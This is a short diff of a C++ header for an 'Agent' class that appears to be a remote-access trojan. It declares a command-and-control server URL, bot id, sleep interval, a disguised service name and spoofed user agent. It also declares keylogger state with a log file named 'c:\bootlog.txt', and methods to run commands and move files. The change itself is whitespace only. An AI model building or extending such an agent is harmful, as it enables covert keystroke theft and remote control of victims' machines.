@@ -4,13 +4,12 @@
 #include "define.h"
 
 class Agent {
-
 public:
 
 	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent",
 		const std::string& _user_agent = "Mozilla/4.0 (compatible)", const std::string& _KeyloggerFile = "c:\bootlog.txt");
 
-	std::string run_command(const std::string& command, bool isLocal=false);
+	std::string run_command(const std::string& command, bool isLocal = false);
 	void cd(const std::string& newdir);
 	void download(const std::string& url);
 	void upload(const std::string& filename);
@@ -48,7 +47,6 @@ private:
 	HANDLE keylogger_task;
 	int shift = 0;
 	int caps = 0;
-
 };
 
 #define HELP_TEXT \
